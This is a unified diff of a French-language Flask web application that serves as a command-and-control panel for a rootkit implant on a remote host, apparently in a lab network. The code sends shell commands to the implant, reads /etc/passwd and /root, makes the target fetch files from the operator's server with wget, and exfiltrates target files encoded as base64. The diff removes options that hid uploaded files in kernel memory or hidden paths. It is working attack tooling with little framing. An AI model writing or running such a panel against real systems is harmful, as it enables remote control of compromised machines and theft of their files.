@@ -1,12 +1,19 @@
 #!/usr/bin/env python3
 
-from flask import Flask, render_template, request, jsonify
+from flask import Flask, render_template, request, jsonify, send_from_directory
 import socket
 import os
 import base64
 import tempfile
+import re
+from werkzeug.utils import secure_filename
 
 app = Flask(__name__)
+
+UPLOAD_FOLDER = '/tmp/flask_uploads'
+
+if not os.path.exists(UPLOAD_FOLDER):
+    os.makedirs(UPLOAD_FOLDER)
 
 @app.route('/')
 def index():
@@ -114,14 +121,9 @@ def index():
                 color: #000;
             }
             
-            .blink {
-                animation: blink-animation 1s steps(2, start) infinite;
-            }
-            
-            @keyframes blink-animation {
-                to {
-                    visibility: hidden;
-                }
+            .upload-button {
+                background-color: #006600 !important;
+                font-weight: bold;
             }
             
             .status-info {
@@ -226,14 +228,6 @@ def index():
                 margin-bottom: 10px;
             }
             
-            .hide-option {
-                margin: 5px 0;
-            }
-            
-            .hide-option input[type="radio"] {
-                margin-right: 10px;
-            }
-            
             #hide-path {
                 background-color: #222;
                 color: #0f0;
@@ -256,7 +250,7 @@ def index():
                 <div class="tab active" onclick="changerMode('commande')">Mode Commande</div>
                 <div class="tab" onclick="changerMode('fichier')">Mode Fichier</div>
                 <div class="tab" onclick="changerMode('upload')">Mode Upload</div>
-                <div class="tab" onclick="document.getElementById('commande').value='FICHIERS'; executerCommande()">Liste fichiers</div>
+                <div class="tab" onclick="testFichiers()">Liste fichiers</div>
             </div>
             
             <div class="status-info">
@@ -273,8 +267,8 @@ def index():
             </div>
             
             <div class="config-panel">
-                <input type="text" id="ip" placeholder="Adresse IP" value="localhost">
-                <input type="text" id="port" placeholder="Port" value="9000">
+                <input type="text" id="ip" placeholder="Adresse IP" value="10.0.2.6">
+                <input type="text" id="port" placeholder="Port" value="8005">
                 <button onclick="testFunction()">Connecter</button>
             </div>
             
@@ -297,19 +291,12 @@ def index():
                     <span class="upload-filename" id="file-selected">Aucun fichier sélectionné</span>
                     
                     <div class="hide-options">
-                        <div><strong>Options de stockage:</strong></div>
-                        <div class="hide-option">
-                            <input type="radio" name="hide-method" id="hide-kernel" value="kernel" checked>
-                            <label for="hide-kernel">Mémoire noyau (volatile)</label>
-                        </div>
-                        <div class="hide-option">
-                            <input type="radio" name="hide-method" id="hide-fs" value="fs">
-                            <label for="hide-fs">Système de fichiers</label>
-                            <input type="text" id="hide-path" placeholder="/var/run/.cache" style="display: none;">
-                        </div>
+                        <div><strong>Chemin de destination:</strong></div>
+                        <input type="text" id="hide-path" placeholder="/tmp/monfichier.ext" value="/tmp/">
                     </div>
                     
-                    <button type="button" onclick="uploadFichier()">Uploader fichier</button>
+                    <button type="button" onclick="uploadViaWget()" class="upload-button">Upload WGET</button>
+                    <button type="button" onclick="downloadFile()" class="upload-button">Download Fichier</button>
                 </form>
             </div>
             
@@ -321,72 +308,62 @@ def index():
                 <button onclick="document.getElementById('commande').value='ls -la /root'; executerCommande()">ls -la /root</button>
                 <button onclick="document.getElementById('commande').value='w'; executerCommande()">users</button>
                 <button onclick="document.getElementById('chemin').value='/etc/passwd'; changerMode('fichier'); lireFichier()">passwd</button>
+                <button onclick="testFichiers()">FICHIERS</button>
             </div>
         </div>
         
         <script>
-          
-        </script>
-    </body>
-
-    <script>
-      let modeActuel = 'commande';
+            let modeActuel = 'commande';
             let connecte = false;
-            let port9000Status = false;
+            let port8005Status = false;
             
             function updateClock() {
                 const now = new Date();
                 let timeText = now.toLocaleTimeString();
                 
-                // Ajouter l'indicateur de statut du port 9000
-                if (port9000Status) {
-                    timeText += " | Port 9000: <span style='color: #0f0;'>OUVERT</span>";
+                if (port8005Status) {
+                    timeText += " | Port 8005: <span style='color: #0f0;'>OUVERT</span>";
                 } else {
-                    timeText += " | Port 9000: <span style='color: #f00;'>FERMÉ</span>";
+                    timeText += " | Port 8005: <span style='color: #f00;'>FERMÉ</span>";
                 }
                 
                 document.getElementById('time').innerHTML = timeText;
             }
             
-            function verifierPort9000() {
+            function verifierPort8005() {
                 const ip = document.getElementById('ip').value;
                 
                 fetch('/api/verifier_port', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ip: ip, port: 9000})
+                    body: JSON.stringify({ip: ip, port: 8005})
                 })
                 .then(response => response.json())
                 .then(data => {
-                    port9000Status = data.ouvert;
+                    port8005Status = data.ouvert;
                     updateClock();
                 })
                 .catch(error => {
-                    console.error("Erreur lors de la vérification du port:", error);
-                    port9000Status = false;
+                    port8005Status = false;
                     updateClock();
                 });
             }
             
-            // Vérifier le port toutes les 5 secondes
-            setInterval(verifierPort9000, 5000);
-            // Vérifier immédiatement au chargement
-            setTimeout(verifierPort9000, 1000);
-            
+            setInterval(verifierPort8005, 5000);
+            setTimeout(verifierPort8005, 1000);
             setInterval(updateClock, 1000);
             updateClock();
-            
-            document.getElementById('hide-fs').addEventListener('change', function() {
-                document.getElementById('hide-path').style.display = this.checked ? 'block' : 'none';
-            });
-            
-            document.getElementById('hide-kernel').addEventListener('change', function() {
-                document.getElementById('hide-path').style.display = this.checked ? 'none' : 'block';
-            });
             
             document.getElementById('file-upload').addEventListener('change', function() {
                 const fileName = this.files[0] ? this.files[0].name : 'Aucun fichier sélectionné';
                 document.getElementById('file-selected').textContent = fileName;
+                
+                if (this.files[0]) {
+                    const currentPath = document.getElementById('hide-path').value;
+                    if (currentPath.endsWith('/')) {
+                        document.getElementById('hide-path').value = currentPath + this.files[0].name;
+                    }
+                }
             });
             
             function changerMode(mode) {
@@ -459,11 +436,7 @@ def index():
                             document.getElementById('machine-info').textContent = hostname;
                             document.getElementById('prompt-text').textContent = `root@${hostname}:~#`;
                             
-                            afficherResultat(`Connexion établie à ${ip}:${port}\nMachine: ${hostname}\n${data.resultat}`);
-                        })
-                        .catch(error => {
-                            document.getElementById('machine-info').textContent = ip;
-                            document.getElementById('prompt-text').textContent = `root@${ip}:~#`;
+                            afficherResultat(`Connexion établie à ${ip}:${port}\\nMachine: ${hostname}\\n${data.resultat}`);
                         });
                     }
                 })
@@ -473,9 +446,8 @@ def index():
                     connecte = false;
                     afficherResultat('Erreur de connexion au serveur: ' + error);
                 });
-            }</script>
-
-            <script>
+            }
+            
             function executerCommande() {
                 const ip = document.getElementById('ip').value;
                 const port = document.getElementById('port').value;
@@ -483,7 +455,7 @@ def index():
                 
                 if (!commande) return;
                 
-                const historyEntry = `${document.getElementById('prompt-text').textContent} ${commande}\n`;
+                const historyEntry = `${document.getElementById('prompt-text').textContent} ${commande}\\n`;
                 afficherResultat(historyEntry + 'Exécution en cours...');
                 
                 fetch('/api/executer', {
@@ -507,20 +479,15 @@ def index():
                 
                 document.getElementById('commande').value = '';
             }
-           
-    
-        </script>
-
-
-        <script>
-         function lireFichier() {
+            
+            function lireFichier() {
                 const ip = document.getElementById('ip').value;
                 const port = document.getElementById('port').value;
                 const chemin = document.getElementById('chemin').value;
                 
                 if (!chemin) return;
                 
-                const historyEntry = `cat ${chemin}\n`;
+                const historyEntry = `cat ${chemin}\\n`;
                 afficherResultat(historyEntry + 'Lecture en cours...');
                 
                 fetch('/api/lire', {
@@ -531,12 +498,6 @@ def index():
                 .then(response => response.json())
                 .then(data => {
                     afficherResultat(historyEntry + data.resultat);
-                    
-                    if (!connecte && !data.resultat.startsWith('Erreur')) {
-                        document.getElementById('status-text').textContent = 'Connecté';
-                        document.getElementById('connection-status').className = 'status-led led-green';
-                        connecte = true;
-                    }
                 })
                 .catch(error => {
                     afficherResultat(historyEntry + "Erreur: " + error);
@@ -544,59 +505,137 @@ def index():
                 
                 document.getElementById('chemin').value = '';
             }
-                    </script>
-
-        <script>
-function uploadFichier() {
-    const ip = document.getElementById('ip').value;
-    const port = document.getElementById('port').value;
-    const fileInput = document.getElementById('file-upload');
-    
-    if (!fileInput.files.length) {
-        afficherResultat("Erreur: Aucun fichier sélectionné");
-        return;
-    }
-    
-    const file = fileInput.files[0];
-    const reader = new FileReader();
-    const hideMethod = document.querySelector('input[name="hide-method"]:checked').value;
-    const hidePath = document.getElementById('hide-path').value;
-    
-    reader.onload = function(e) {
-        const fileData = e.target.result.split(',')[1];
-        
-        // Afficher message de départ sans référence à data
-        afficherResultat("Envoi du fichier en cours... Fichier: " + file.name + " - Taille: " + file.size + " octets");
-        
-        fetch('/api/upload', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                ip: ip, 
-                port: port,
-                filename: file.name,
-                filedata: fileData,
-                hidemethod: hideMethod,
-                hidepath: hidePath
-            })
-        })
-        .then(response => response.json())
-        .then(data => {
-            // Maintenant data est défini
-            afficherResultat("Envoi du fichier en cours... Fichier: " + file.name + " - Taille: " + file.size + " octets - " + data.resultat);
-        })
-        .catch(error => {
-            afficherResultat("Erreur lors de l'upload: " + error);
-        });
-    };
-    
-    reader.readAsDataURL(file);
-}
             
-            </script>
-            <script>
+            function uploadViaWget() {
+                const fileInput = document.getElementById('file-upload');
+                
+                if (!fileInput.files.length) {
+                    afficherResultat("Erreur: Aucun fichier sélectionné");
+                    return;
+                }
+                
+                const file = fileInput.files[0];
+                const reader = new FileReader();
+                
+                reader.onload = function(e) {
+                    const fileData = e.target.result.split(',')[1];
+                    const targetPath = document.getElementById('hide-path').value || `/tmp/${file.name}`;
+                    
+                    afficherResultat(`Upload via WGET: ${file.name} (${file.size} octets)\\nDestination: ${targetPath}\\n\\nEtape 1/2: Stockage sur serveur Flask...`);
+                    
+                    fetch('/api/store_file', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            filename: file.name,
+                            filedata: fileData
+                        })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.success) {
+                            afficherResultat(`Upload via WGET: ${file.name}\\nDestination: ${targetPath}\\n\\nEtape 1/2: Fichier stocké sur serveur\\nURL: ${data.download_url}\\n\\nEtape 2/2: Téléchargement via wget...`);
+                            
+                            const ip = document.getElementById('ip').value;
+                            const port = document.getElementById('port').value || '8005';
+                            
+                            fetch('/api/wget_download', {
+                                method: 'POST',
+                                headers: {'Content-Type': 'application/json'},
+                                body: JSON.stringify({
+                                    ip: ip,
+                                    port: port,
+                                    download_url: data.download_url,
+                                    target_path: targetPath,
+                                    method: 'wget'
+                                })
+                            })
+                            .then(response => response.json())
+                            .then(wgetData => {
+                                afficherResultat(`Upload via WGET: ${file.name} vers ${targetPath}\\n\\n${wgetData.resultat}\\n\\nUpload terminé avec succès`);
+                                
+                                document.getElementById('file-upload').value = '';
+                                document.getElementById('file-selected').textContent = 'Aucun fichier sélectionné';
+                                document.getElementById('hide-path').value = '/tmp/';
+                            })
+                            .catch(error => {
+                                afficherResultat(`Erreur wget: ${error}`);
+                            });
+                        } else {
+                            afficherResultat(`Erreur stockage: ${data.error}`);
+                        }
+                    })
+                    .catch(error => {
+                        afficherResultat(`Erreur stockage fichier: ${error}`);
+                    });
+                };
+                
+                reader.readAsDataURL(file);
+            }
+            
+            function downloadFile() {
+                const filePath = prompt('Chemin du fichier à télécharger:', '/root/');
+                if (!filePath) return;
+                
+                const ip = document.getElementById('ip').value;
+                const port = document.getElementById('port').value || '8005';
+                
+                afficherResultat(`Download: ${filePath}\\nVérification et téléchargement...`);
+                
+                fetch('/api/download_file', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        ip: ip,
+                        port: port,
+                        file_path: filePath
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        const link = document.createElement('a');
+                        link.href = data.download_url;
+                        link.download = data.filename;
+                        document.body.appendChild(link);
+                        link.click();
+                        document.body.removeChild(link);
+                        
+                        afficherResultat(`Download: ${filePath}\\n\\nFichier téléchargé avec succès: ${data.filename}\\nTaille: ${data.size} octets`);
+                    } else {
+                        afficherResultat(`Download: ${filePath}\\n\\nErreur: ${data.error}\\n\\nDébug: Vérifiez que le fichier existe et que vous avez les permissions.`);
+                    }
+                })
+                .catch(error => {
+                    afficherResultat(`Erreur download: ${error}\\n\\nConseil: Vérifiez la connexion et le chemin du fichier.`);
+                });
+            }
+            
+            function testFichiers() {
+                const ip = document.getElementById('ip').value;
+                const port = document.getElementById('port').value || '8005';
+                
+                fetch('/api/commande_rootkit', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        ip: ip, 
+                        port: port,
+                        commande: 'FICHIERS'
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    afficherResultat(`Fichiers en mémoire rootkit:\\n${data.resultat}`);
+                })
+                .catch(error => {
+                    afficherResultat(`Erreur: ${error}`);
+                });
+            }
+            
             document.getElementById('commande').focus();
-            </script>
+        </script>
+    </body>
     </html>
     '''
 
@@ -604,7 +643,7 @@ function uploadFichier() {
 def verifier_port():
     data = request.json
     ip = data.get('ip')
-    port = int(data.get('port', 9000))
+    port = int(data.get('port', 8005))
     
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -612,7 +651,6 @@ def verifier_port():
         resultat = s.connect_ex((ip, port))
         s.close()
         
-        # Si resultat est 0, le port est ouvert
         if resultat == 0:
             return jsonify({"ouvert": True})
         else:
@@ -624,7 +662,7 @@ def verifier_port():
 def executer():
     data = request.json
     ip = data.get('ip')
-    port = int(data.get('port', 8001))
+    port = int(data.get('port', 8005))
     commande = data.get('commande')
     
     resultat = envoyer_commande(ip, port, "EXEC " + commande)
@@ -634,59 +672,186 @@ def executer():
 def lire():
     data = request.json
     ip = data.get('ip')
-    port = int(data.get('port', 8001))
+    port = int(data.get('port', 8005))
     chemin = data.get('chemin')
     
     resultat = envoyer_commande(ip, port, "LIRE " + chemin)
     return jsonify({"resultat": resultat})
 
-@app.route('/api/upload', methods=['POST'])
-def upload():
+@app.route('/api/store_file', methods=['POST'])
+def store_file():
     data = request.json
-    ip = data.get('ip')
-    port = int(data.get('port', 8001))
     filename = data.get('filename')
     filedata = data.get('filedata')
-    hidemethod = data.get('hidemethod', 'kernel')
-    hidepath = data.get('hidepath', '')
+    
+    if not filename or not filedata:
+        return jsonify({"error": "Nom de fichier et données requis"}), 400
     
     try:
         file_content = base64.b64decode(filedata)
+        clean_filename = secure_filename(filename)
+        if not clean_filename:
+            clean_filename = "uploaded_file"
         
-        with tempfile.NamedTemporaryFile(delete=False) as temp_file:
-            temp_path = temp_file.name
-            temp_file.write(file_content)
+        file_path = os.path.join(UPLOAD_FOLDER, clean_filename)
         
-        upload_cmd = f"UPLOAD {filename} {hidemethod}"
-        if hidemethod == "fs" and hidepath:
-            upload_cmd += f" {hidepath}"
+        with open(file_path, 'wb') as f:
+            f.write(file_content)
         
-        resultat = envoyer_commande(ip, port, upload_cmd)
+        download_url = f"http://{request.host}/download/{clean_filename}"
         
-        with open(temp_path, 'rb') as f:
-            file_content = f.read()
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(15)
-            s.connect((ip, int(port)))
-            s.sendall(file_content)
+        return jsonify({
+            "success": True,
+            "filename": clean_filename,
+            "size": len(file_content),
+            "download_url": download_url,
+            "file_path": file_path
+        })
+        
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+@app.route('/download/<filename>')
+def download_file_serve(filename):
+    try:
+        return send_from_directory(UPLOAD_FOLDER, filename)
+    except Exception as e:
+        return f"Erreur: {str(e)}", 404
+
+@app.route('/api/download_file', methods=['POST'])
+def download_file_from_target():
+    data = request.json
+    ip = data.get('ip')
+    port = int(data.get('port', 8005))
+    file_path = data.get('file_path')
+    
+    if not file_path:
+        return jsonify({"error": "Chemin de fichier requis"}), 400
+    
+    try:
+        check_cmd = f"ls -la '{file_path}'"
+        check_result = envoyer_commande(ip, port, "EXEC " + check_cmd)
+        
+        if check_result.startswith('Erreur') or 'No such file' in check_result or 'cannot access' in check_result:
+            check_cmd2 = f"[ -f '{file_path}' ] && echo 'EXISTS' || echo 'NOT_EXISTS'"
+            check_result2 = envoyer_commande(ip, port, "EXEC " + check_cmd2)
             
-            reponse = b""
-            try:
-                s.settimeout(2)
-                reponse = s.recv(4096)
-            except socket.timeout:
-                pass
-            s.close()
+            if 'NOT_EXISTS' in check_result2 or check_result2.startswith('Erreur'):
+                return jsonify({"error": f"Fichier non trouvé: {file_path} - Debug: {check_result}"}), 404
         
-        os.unlink(temp_path)
+        cmd = f"base64 '{file_path}' 2>/dev/null"
+        resultat = envoyer_commande(ip, port, "EXEC " + cmd)
         
-        if reponse:
-            return jsonify({"resultat": f"Fichier uploadé avec succès.\n{reponse.decode()}"})
-        else:
-            return jsonify({"resultat": "Fichier uploadé avec succès."})
+        if resultat.startswith('Erreur') or 'No such file' in resultat or 'cannot access' in resultat or 'command not found' in resultat:
+            return jsonify({"error": f"Erreur lors de l'encodage: {resultat}"}), 500
+        
+        lines = resultat.split('\n')
+        base64_content = ""
+        
+        for line in lines:
+            line = line.strip()
+            if 'Code de retour' in line or 'Erreur' in line or line == '' or 'vagrant@' in line:
+                continue
+            clean_line = re.sub(r'[^A-Za-z0-9+/=]', '', line)
+            if clean_line:
+                base64_content += clean_line
+        
+        if not base64_content:
+            return jsonify({"error": f"Aucun contenu base64 valide trouvé. Sortie brute: {resultat}"}), 500
+        
+        if len(base64_content) % 4 != 0:
+            padding = 4 - (len(base64_content) % 4)
+            if padding != 4:
+                base64_content += '=' * padding
+        
+        if not re.match(r'^[A-Za-z0-9+/=]+$', base64_content):
+            return jsonify({"error": f"Format base64 invalide après nettoyage. Contenu: {base64_content[:100]}... Sortie originale: {resultat[:200]}"}), 500
+        
+        try:
+            file_content = base64.b64decode(base64_content)
+            filename = os.path.basename(file_path)
+            
+            if not filename:
+                filename = "downloaded_file"
+            
+            safe_filename = secure_filename(filename)
+            if not safe_filename:
+                safe_filename = "downloaded_file"
+                
+            download_path = os.path.join(UPLOAD_FOLDER, f"download_{safe_filename}")
+            
+            with open(download_path, 'wb') as f:
+                f.write(file_content)
+            
+            download_url = f"http://{request.host}/download/download_{safe_filename}"
+            
+            return jsonify({
+                "success": True,
+                "filename": f"download_{safe_filename}",
+                "size": len(file_content),
+                "download_url": download_url,
+                "original_path": file_path
+            })
+            
+        except Exception as e:
+            return jsonify({"error": f"Erreur décodage base64: {str(e)} - Contenu reçu: {resultat[:200]}"}), 500
             
     except Exception as e:
-        return jsonify({"resultat": f"Erreur lors de l'upload: {str(e)}"})
+        return jsonify({"error": f"Erreur téléchargement: {str(e)}"}), 500
+
+@app.route('/api/wget_download', methods=['POST'])
+def wget_download():
+    data = request.json
+    ip = data.get('ip')
+    port = int(data.get('port', 8005))
+    download_url = data.get('download_url')
+    target_path = data.get('target_path', '/tmp/')
+    method = data.get('method', 'wget')
+    
+    if not download_url:
+        return jsonify({"resultat": "Erreur: URL requis"})
+    
+    try:
+        if method == 'wget':
+            cmd = f"wget -O '{target_path}' '{download_url}'"
+        else:
+            return jsonify({"resultat": "Erreur: Méthode non supportée"})
+        
+        resultat = envoyer_commande(ip, port, "EXEC " + cmd)
+        
+        return jsonify({"resultat": f"Commande exécutée: {cmd}\n\nRésultat:\n{resultat}"})
+        
+    except Exception as e:
+        return jsonify({"resultat": f"Erreur: {str(e)}"})
+
+@app.route('/api/commande_rootkit', methods=['POST'])
+def commande_rootkit():
+    data = request.json
+    ip = data.get('ip')
+    port = int(data.get('port', 8005))
+    commande = data.get('commande')
+    
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(10)
+        s.connect((ip, int(port)))
+        
+        s.send(commande.encode())
+        
+        reponse = b""
+        chunk = s.recv(5000)
+        while chunk:
+            reponse += chunk
+            try:
+                s.settimeout(0.5)
+                chunk = s.recv(5000)
+            except socket.timeout:
+                break
+        
+        s.close()
+        return jsonify({"resultat": reponse.decode()})
+    except Exception as e:
+        return jsonify({"resultat": f"Erreur: {str(e)}"})
 
 def envoyer_commande(ip, port, message):
     try:
@@ -696,12 +861,12 @@ def envoyer_commande(ip, port, message):
         s.send(message.encode())
         
         reponse = b""
-        chunk = s.recv(4096)
+        chunk = s.recv(5000)
         while chunk:
             reponse += chunk
             try:
                 s.settimeout(0.5)
-                chunk = s.recv(4096)
+                chunk = s.recv(5000)
             except socket.timeout:
                 break
         
@@ -711,4 +876,8 @@ def envoyer_commande(ip, port, message):
         return f"Erreur: {str(e)}"
 
 if __name__ == '__main__':
+    print("Serveur Flask démarré")
+    print(f"Dossier uploads: {UPLOAD_FOLDER}")
+    print("Interface web: http://0.0.0.0:5000")
+    print("Upload via wget disponible")
     app.run(host='0.0.0.0', port=5000, debug=True)
